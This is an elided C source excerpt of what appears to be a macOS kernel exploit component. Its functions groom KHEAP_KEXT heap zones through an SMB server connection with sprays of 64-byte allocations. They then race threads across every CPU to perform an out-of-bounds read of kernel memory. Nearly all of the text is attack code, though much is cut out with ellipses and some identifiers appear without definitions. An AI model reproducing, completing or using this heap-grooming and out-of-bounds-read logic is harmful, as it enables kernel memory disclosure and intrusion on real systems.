...
///
/// Uses module `xe_oob_reader_base.c` to provide safe OOB read from zones in `KHEAP_KEXT`
...
xe_allocator_nrnw_t xe_oob_reader_ovf_fragment_default_64(const struct sockaddr_in* smb_addr) {
    /// The allocations made by `xe_allocator_nrnw` are made on zones from `KHEAP_KEXT`
    ...
    xe_allocator_nrnw_t element_allocator = xe_allocator_nrnw_create(smb_addr);
    
    xe_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_START_PAGES * XE_PAGE_SIZE / 64);
    for (int i=0; i<NUM_KEXT_64_READ_SLOTS; i++) {
        xe_allocator_nrnw_allocate(gap_allocator, 64, 1);
        xe_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_ELEMENTS_PER_GAP);
    }
    xe_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_END_PAGES * XE_PAGE_SIZE / 64);
...
float xe_oob_reader_ovf_check(const struct sockaddr_in* smb_addr, uint8_t zone_size, uint8_t addr_len) {
    ...
    *local_nb_name_size = 2048;
    ...
    for (int i=0; i<NUM_SAMPLES_FOR_PROBABILITY; i++) {
        ...
        dispatch_async(xe_dispatch_queue(), ^() {
            ...
            xe_oob_reader_base_read(&params, NULL, NULL, local_nb_name, local_nb_name_size);
        ...
        /// with safe allocations of `xe_oob_reader_ovf_fragment_default_64`
...
int xe_oob_reader_ovf_read_internal(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
...
//    xe_assert_cond(zone_size, >=, 64);
    ...
    xe_allocator_nrnw_t element_allocator = xe_oob_reader_ovf_fragment_default_64(smb_addr);
    ...
    for (int i=0; i<MAX_TRIES; i++) {
        ...
        double probability = xe_oob_reader_ovf_check(smb_addr, zone_size, zone_size * 2);
    ...
    xe_allocator_nrnw_destroy(&element_allocator);
    return error;
}
...
int xe_oob_reader_ovf_read(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
    ...
    *stop = FALSE;
    ...
    dispatch_apply(xe_cpu_count(), queue, ^(size_t index) {
        if (index == 0) {
            xe_sleep_ms(10);
            *res = xe_oob_reader_ovf_read_internal(smb_addr, zone_size, data, data_size);
            *stop = TRUE;
        } else {
